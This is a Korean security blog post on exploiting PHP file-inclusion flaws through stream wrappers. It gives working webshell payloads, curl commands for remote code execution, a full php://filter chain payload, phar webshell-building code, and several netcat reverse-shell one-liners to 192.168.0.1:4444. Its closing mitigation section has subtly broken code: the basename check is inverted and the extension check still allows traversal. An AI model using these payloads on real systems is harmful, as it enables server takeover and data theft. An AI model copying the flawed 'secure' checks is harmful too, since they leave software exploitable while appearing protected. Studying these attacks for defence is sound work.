---
title: "Attack using PHP Wrapper"
tags:
    - Hacking
    - Web
    - PHP Wrapper
date: "2025-01-03"
thumbnail: "/assets/Security/Web/250103_Attack_using_PHP_Wrapper/thumbnail.png"
---

# Intro
---
이 포스트에서는 PHP Wrapper를 이용한 공격에 대해 알아볼 예정이다.

먼저 정보 기술에서 말하는 Wrapper는 실제 데이터의 앞에서 어떤 틀을 잡아주는 데이터 또는 다른 프로그램이 성공적으로 실행되도록 설정하는 프로그램이다.
이러한 개발을 위한 기능인 PHP Wrapper를 이용하여 공격을 수행하는 방법을 알아보자.

# FI
---
File Inclusion 공격은 공격자가 악성 서버 스크립트를 서버에 전달하여 해당 페이지를 통해 악성 코드가 실행되도록 하는 취약점을 뜻한다.
이 취약점은 웹 애플리케이션에서 파일을 동적으로 로드할 때 발생한다. 이 때 애플리케이션은 파일 이름을 사용자 입력값으로 설정하여, 입력값 검증이 미흡하다면 공격자가 파일 시스템의 다른 파일에 접근할 수 있다.
※ Injection은 주입하는 방식, Inclusion은 포함시키는 방식의 해킹 기법이다.

<br />
동적으로 파일을 로딩할 때, 삽입할 악성 서버 스크립트 파일 위치에 따라 LFI(Locla File Inclusion)와 RFI(Remote File Inclusion)로 나눈다.
LFI는 <u>서버의 로컬 파일을 포함하는 취약점</u>으로, 서버 내에 존재하는 파일만 읽을 수 있다.
RFI는 <u>원격 파일을 포함할 수 있는 취약점</u>으로, 외부에서 제공되는 파일을 포함할 수 있어 악성 코드를 실행할 가능성이 더 크다.

주로 PHP와 같은 서버 측 스크립트 언어에서 발견되며, 주로 PHP 코드 상에서 `include()`, `include_once()`, `require()`, `require_once()`, `file_get_contents()`, `fopen()`과 같은 타 파일을 불러오는 함수 사용 시에 사용자 입력값 검증이 미흡하여 발생한다.
<br />

일반적으로 경로 조작 기법을 이용하여 서버 중요 파일에 접근하거나 RCE를 수행할 수 있다.

그 예시로, 아래와 같이 파일을 호출할 때, file 파라미터에 `../../../../proc/self/environ`(파일명에 접두사가 붙을 시 디렉터리로 인식하도록 `/` 추가해야 할 경우도 존재)을 삽입한다.
이후 `User-Agent` 헤더에 `<?php system('id') ?>`와 같은 명령어를 삽입하고 페이지에 포함된 `/proc/self/environ` 파일을 살펴보면, `HTTP_USER_AGENT` 환경변수 값이 실행한 명령어의 결과임을 확인할 수 있다.

```php
<?php include 'file_'.$_GET['file']; ?>
```

# PHP Wrapper
---
PHP Wrapper는 다양한 리소스나 프로토콜에 액세스 해주는 Wrapper이다. 파일 시스템, 네트워크 리소스, 데이터 스트림 등을 처리하기 위한 기능을 제공한다.
다양한 Wrapper가 존재하는데 아래의 함수를 이용하여 기본적으로 제공하는 Wrapper를 확인할 수 있다. 자세한 내용은 [PHP Wrappers][PHP Wrappers]를 살펴보자.
```php
<?php print_r(stream_get_wrappers()); ?>
```

공격에 주로 사용되는 Wrapper는 `data://`, `php://input`, `php://filter`, `expect://`, `zip://`, `phar://`이다. 따라서 해당 Wrapper에 대해서만 설명하려 한다.

## data://
Data Wrapper는 외부의 데이터나 PHP 코드를 실행시키는 데 사용된다.
외부 파일을 포함시킬 시에는 원격 파일에 엑세스하여 URL로 로드할 수 있도록 하는 설정값인 `allow_url_include`와 `allow_url_fopen`을 on으로 설정해야 한다.
※ php.ini 파일 위치 : /etc/php/\[버전\]/fpm/php.ini

> **allow_url_include 지시문**
    1. 활성화(on) 시 include, require 등의 함수 사용 시 외부 파일 포함 허용
    2. 비활성화(off) 시 php://input, php://stdin, php://memory, php://temp, data:// Wrapper 사용 불가

> **allow_url_fopen 지시문**
    1. 활성화(on) 시 file_get_contents, fopen 등의 함수 사용 시 외부 파일 읽고 쓰기 허용
    2. 비활성화(off) 시 http://, https://, ftp://, ftps://, data:// Wrapper 사용 불가

사용자 입력값이 검증없이 `include` 함수의 인자가 된다면, 외부 파일을 호스팅할 필요 없이 RCE 할 수 있다. 리눅스 환경에서 `$` 문자는 환경변수 참조 시 사용하는 문자로 이를 이스케이프 하기 위해서는 `"`가 아닌 `'`로 문자열을 감싸야 한다.
```shell
attacker echo -n '<?php system($_GET["cmd"]); ?>' | base64
attacker$ curl "$URL/?parameter=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2b&cmd=whoami"
```

## php://input
php://input는 <u>POST 메서드로 요청 시 데이터(HTTP Body)를 읽을 수 있는 읽기 전용 스트림이다.</u>
php://input은 `enctype="multipart/form-data"` 와 함께 사용할 수 없으며, `allow_url_include`가 on으로 설정되어 있어야 한다.

POST 메서드 사용 시 HTTP Body로 전달된 데이터를 입력받아온다.
HTTP Body 데이터에 웹셸 코드를 삽입하여 페이지에 코드 실행 결과를 포함시키는 방식으로 RCE 등의 코드 실행이 가능하다.
```shell
attacker$ curl -X POST --data "<?php system('id'); ?>" "$URL?parameter=php://input"
attacker$ curl -X POST --data "<?php file_get_contents('/etc/passwd'); ?>" "$URL?parameter=php://input"
```

## php://filter
php://filter는 <u>스트림을 여는 시점에 필터를 적용할 수 있도록 설계된 Wrapper</u>이다. 이는 `readfile()`, `file()`, `file_get_contents()` 와 같은 파일 함수가 작동하기 전에 스트림 콘텐츠를 변경할 수 있다는 것이다.
```shell
attacker$ curl "$URL?parameter=php://filter/$FILTERS/resource=$FILE"
```

Filter Wrapper는 파일의 I/O에 선택한 filters를 적용시켜 준다.

|**String**|string.rot13, string.toupper/tolower, string.strip_tags|
|**Conversion**|convert.base64-encode/decode, convert.quoted-printable-encode/decode, convert.iconv.*|
|**Compression**|zlib.deplate/inflate, bzip2.compress/decompress|
|**Other**|consumed, dechunk, convert.*|

Filter Wrapper 사용 시 다음의 매개변수를 사용하며, 여러 필터 체인을 하나의 경로에 지정할 수 있다.

|**resource=\[Stream\]**|필수, 필터링을 설정할 스트림 지정|
|**read=\[Filter\]**|선택, \|(vertical bar)로 구분하여 하나 이상의 filters 적용|
|**write=\[Filter\]**|선택, \|(vertical bar)로 구분하여 하나 이상의 filters 적용|
|**-**|read, write로 시작하지 않거나 없을 시 read/write 모두 적용|

<br />
만약 `include` 함수로 file 파라미터값에 PHP 확장자를 추가한 파일을 포함시킬 때 웹 소스코드를 포함하는 LFI 공격을 수행할 수 있다.
※ 확장자 추가 시 Null Byte Injection을 이용하여 확장자를 무시하는 기법은 PHP 5.3.4 버전에서 패치되었다.
```php
<?php include $_GET['file']?$_GET['file'].'.php':'main.php'; ?>
```

아래는 index.php 소스코드를 확인하는 예시이다.
`file://` 등의 Wrapper를 이용하여 삽입 시 PHP 파일이 실행되어 웹 소스코드 확인은 불가하다.
따라서 `php://filter`를 이용하여 PHP 파일이 실행되기 전에 필터를 적용한다. 보통 base64 인코딩을 사용하고, 인코딩 방식마다 소스코드가 반환되지 않을수도 있다.
```php
<?php include 'php://filter/convert.base64-encode/resource=../index'.'.php' ?>
<?php include 'php://filter/read=convert.base64-encode/resource=/var/www/html/index'.'.php' ?>
<?php include 'php://filter/convert.quoted-printable-encode/resource=../index'.'.php' ?>
<?php include 'php://filter/read=convert.quoted-printable-encode/resource=/var/www/html/index'.'.php' ?>
<?php include 'php://filter/string.rot13/resource=../index'.'.php' ?>
<?php include 'php://filter/read=string.rot13/resource=/var/www/html/index'.'.php' ?>
```


### RCE using php://filter + php://temp 
php://temp는 <u>임시 데이터를 파일과 같은 Wrapper에 저장할 수 있는 read-write 스트림</u>이다.
기본적으로 비어있기 때문에  `echo file_get_contents('php://temp');` 코드 실행 시 어떠한 값도 출력하지 않는다. 해당 Wrapper 사용을 위해서는 `allow_url_include`가 on으로 설정되어 있어야 한다.

이러한 php://temp와 php://filter를 이용하여 RCE 공격을 수행할 수 있는 방법이 있는데, 그건 바로 <u>php://filter를 이용하여 웹셸 코드의 필터체인을 생성한 후 php://temp에 저장하는 것이다.</u>

<br />

이 때 php://temp에 삽입할 웹셸 코드의 필터 체인은 [PHP Filter Chain 스크립트][PHP Filter Chain 스크립트]를 통해 생성할 수 있다.
해당 스크립트를 통해 웹셸 코드를 생성하는 방식에 대해 간략히 설명해보겠다. 자세한 내용은 [PHP Filters Chain][PHP Filters Chain]을 참고하자.

PHP Filter Chain을 통해 생성 가능한 문자열은 `0-9a-z-A-Z/+`이다. Filter Chain을 이용하여 `0`을 획득하는 걸 예시로 설명해보겠다.

먼저 `convert.iconv.*` 필터를 이용할 때에는 어떠한 인코딩 방식으로 변환하는지에 따라 쓰레기 값이 반환된다. 코드를 참조하여 `0`에 해당하는 값 앞에 `convert.iconv.UTF8.CSISO2022KR` 필터 추가 시, `0`을 포함한 쓰레기 값(ESC$)C)이 출력된다.

이후 반환된 쓰레기 값에 `base64_decode` 함수 사용 시 형식에 맞지 않는 값(쓰레기 값)이 제거하여 반환하고, 그 값을 다시 base64로 인코딩했을 때 획득하려 했던 `0`이 맨 앞에 위치함을 확인할 수 있다.
```php
// �����0ESC$)C
<?php echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2/resource=php://temp'); ?>
// 0A==
<?php echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode/resource=php://temp'); ?>
```

<br />
이와 같이 base64로 인코딩한 값에서 원하는 값을 획득하기 위해 다시 디코딩하여 쓰레기값을 제외한 원하는 문자만을 획득하려 한다.

하지만 base64로 인코딩한 값에 `=` 문자가 존재하는데 `convert.base64-decode` 필터는 `base64_decode` 함수와 `=` 문자 해석에 차이가 있어 원하는 값을 추출하지 못한다.
이에 `=` 문자를 제거하거나 필터에 영향이 가지 않도록 변환하는 `convert.iconv.UTF8.UTF7` 필터를 사용하여 에러가 발생하지 않도록 처리한다.
```php
<?php 
    echo file_get_contents(
    'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|
        [문자 필터 체인 1]
        |convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|
        [문자 필터 체인 2]
        |convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode
        /resource=php://temp');
?>
```

PHP Filter Chain은 데이터가 필터를 거치며 처리되어, 역순으로 데이터가 처리된다. 따라서 `0`을 base64로 인코딩한 값이 `MA==`이므로, 순차적으로 `A`, `M`에 해당하는 필터를 작성해주면 된다.
```php
<?php
    echo file_get_contents(
    'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|
        convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213
        |convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|
        convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T
        |convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp'
    );
?>
```
<br />

이제 스크립트를 사용해보자.
먼저 `<?= ... ;?>`인 `<?php echo ...; ?>`의 축약형(short echo tag)과 `shell_exec()` 함수와 동일한 역할을 하는 ``` `` ``` 연산자를 이용하여 웹셸을 작성한다.
```php
<?php system($_GET['cmd']); ?>
<?=`$_GET['cmd']`;?>
```

작성한 웹셸 코드에 해당하는 필터 체인을 생성해보았다.
```shell
attacker$ python php_filter_chain_generator.py --chain "<?=`$_GET['cmd']`;?>"
```
```php
<?php echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp'); ?>
```

생성한 필터 체인을 이용하여 RCE를 수행해보자.
`include` 함수 안에 들어갈 `file` 파라미터값에 생성한 필터 체인을 삽입하고, `cmd` 인수에 실행하고 싶은 시스템 명령을 삽입하여 LFI를 이용한 RCE 공격을 수행한다.
```shell
attacker$ curl "$URL?cmd=whoami&file=$FILTERCHAIN"
```

## expect://
Expect Wrapper는 스트림을 열어 PTY를 통해 프로세스의 stdio, stdout,stderr에 대한 엑세스를 제공한다. 쉽게 말해 URL 스트림을 통해 <u>시스템 명령을 실행시켜주는 Wrapper</u>이다.
하지만 기본적으로 지원하지 않아 PECL에서 제공하는 `Expect` 확장 프로그램을 설치해야 한다.

만약 Expect Wrapper를 공격 대상 서버에서 지원한다면, 아래의 코드를 통해 시스템 명령을 실행할 수 있다.
```shell
attacker$ curl "$URL?file=expect://ls"
```

## zip://
Zip Wrapper는 <u>압축 파일을 조작하기 위한 Wrapper</u>이다. 파일의 압축을 풀고 압축을 푼 파일 내의 코드를 실행시켜주는 기능을 한다.

LFI 취약점이 존재하며 압축 파일 업로드가 가능한 환경에서 RCE 공격을 하는 방법에 대해 알아보자.

먼저 웹셸을 생성하고 압축한 후 웹 서버 내에 웹셸 압축 파일을 업로드한다.
```shell
attacker$ echo "<?php system($_GET['cmd']); ?>" > cmd.php
attacker$ zip file.zip cmd.php
```

업로드한 파일의 경로가 `/var/www/html/uploads/file.zip`이라는 상황을 가정하고, LFI 취약점이 존재하는 페이지에서 Zip Wrapper를 이용하여 RCE를 수행한다.
```shell
attacker$ curl "$URL?file=zip:///var/www/html/uploads/file.zip%23cmd.php&cmd=whoami"
```

추가적으로 동일한 상황일 때 인라인 코드를 통해 리버스 셸을 연결할 수 있다.
먼저 공격자의 PC에서 `netcat`을 통해 특정 포트를 열어놓고 인라인 코드를 삽입하여 리버스셸을 연결한다.
※ [Girsh][Girsh] 등과 같은 툴을 통해 쉽게 리버스 셸 코드를 획득할 수 있다.
```shell
attacker$ nc -lvnp 4444
attacker$ curl "$URL?file=zip://file.zip#cmd.php&cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>&1|nc+192.168.0.1+4444>/tmp/f"
```
```shell
victim$ nc -e /bin/sh 192.168.0.1 4444
victim$ nc -e /bin/bash 192.168.0.1 4444
victim$ nc -c bash 192.168.0.1 4444
victim$ mknod backpipe p && nc 192.168.0.1 4444 0<backpipe | /bin/bash 1>backpipe
victim$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.1 4444 >/tmp/f
victim$ rm -f /tmp/p; mknod /tmp/p p && nc 192.168.0.1 4444 0/tmp/p 2>&1
victim$ rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 192.168.0.1 4444 > f
victim$ rm -f x; mknod x p && nc 192.168.0.1 4444 0<x | /bin/bash 1>x
```


## phar://
Phar Wrapper는 <u>PHP Archive를 지원하는 스트림 Wrapper</u>로, PHAR 파일 내부에 있는 데이터를 파일처럼 접근 가능하도록 도와준다.

여기서 PHAR(PHP Archive)이란 PHP에서 지원하는 압축 및 아카이브 포맷으로, 실행 가능한 PHP 코드를 포함할 수 있다. 기본적으로 생성 시 읽기 전용으로 설정되어 있다.
<br />
LFI 취약점이 존재하며 phar 파일 업로드가 가능한 환경에서 RCE 공격을 하는 방법에 대해 알아보자.


먼저 `cmd.txt` 웹셸 파일을 포함한 `cmd.phar` 파일을 생성하고, `setStub()` 함수를 통해 PHAR 파일 시작 시 `__HALT_COMPILER()` 명령(PHP 코드 실행 중단)을 통해 PHAR 파일이 정상적으로 작동하도록 설정하는 코드(cmd.php)를 작성한다.
```php
<?php
    $phar = new Phar('cmd.phar');
    $phar->startBuffering();
    $phar->addFromString('cmd.txt', '<?php system($_GET["cmd"]); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    $phar->stopBuffering();
?>
```

PHAR 파일의 `phar.readonly` 설정을 비활성화한 후 `cmd.php`를 실행하여 `cmd.phar`을 생성한다. 확장자 검증을 수행할 수 있기 때문에 확장자도 변경하자.
```shell
attacker$ php --define phar.readonly=0 cmd.php && mv cmd.phar cmd.jpg
```

파일 업로드 경로가 `/var/www/html/uploads/cmd.jpg`라는 사실을 가정하고, LFI 취약점이 존재하는 페이지에서 Phar Wrapper를 이용하여 RCE를 수행한다.
```shell
attacker$ curl "$URL/?file=phar:///var/www/html/uploads/cmd.jpg/cmd.txt&cmd=whoami"
```


[PHP Filter Chain 스크립트]:https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py
[Girsh]:https://github.com/nodauf/Girsh
[PHP Wrapper]:https://www.php.net/manual/en/wrappers.php
[PHP Filters Chain]:https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html


# 대응방안
---

### 입력값 검증
사용자로부터 입력받은 파일 경로나 파일명 등의 값에 대해 검증한다.
입력값을 사용하기 전에 절대경로와 상대경로를 구분하고, 접두어를 검사하여 Wrapper를 사용하는지 확인한다.

파일 경로나 파일명 등의 입력값을 처리할 때 WhiteList를 사용하여 허용된 값만 처리하도록 설정한다.
허용된 디렉터리나 파일 리스트를 미리 지정하고, 그 외의 값을 거부한다.

### Wrapper 사용제한
file://, http://, ftp:// 등의 Wrapper 사용 시에는 제한된 범위 내에서만 사용하도록 설정한다.
특정 디렉터리나 파일을 제외한 나머지는 Wrapper를 사용하지 못하도록 제한한다.

### open_basedir 설정
php.ini 파일을 수정하여 open_basedir 설정을 통해 파일 시스템에 접근 가능한 범위(특정 디렉터리 이하 파일만 읽기 허용)를 제한한다.
```
open_basedir = /var/www/html/
```

### Secure Coding
realpath 함수는 상대경로나 가상경로 등을 절대경로로 변환해주는 함수이다.
입력된 파일 경로가 허용된 경로가 아니라면 거부하는 방식으로 상대경로를 조작하는 LFI 취약점을 방지할 수 있다.
```php
<?php
    $path = realpath($_GET['path']);
    if (strpos($path, '/var/www/html/') === 0) {
        include $path;
    } else {
        die('Access denied');
    }
?>
```

pathinfo 함수는 파일 경로를 파싱하고 파일명, 디렉터리명, 확장자 등의 정보를 반환하는 함수이다. 이를 이용하여 확장자 파싱 후 검증한다.
```php
<?php
    $path = $_GET['path'];
    $ext = pathinfo($path, PATHINFO_EXTENSION);
    if (in_array($ext, ['php', 'inc'])) {
        include $path;
    } else {
        die('Access denied');
    }
?>
```

basename 함수는 파일 경로에서 파일명만 추출하는 함수이다.
include 함수를 통해 특정 페이지를 파라미터값을 참조하여 보여줄 때, 특정 파일명 외의 파일은 허용하지 않는다.
```php
<?php
    $path = $_GET['path'];
    if (strpos($path, '/') !== false && strpos($path, '..') !== false && basename($path) === 'main.php') {
        include $path;
    } else {
        die('Access denied');
    }
?>
```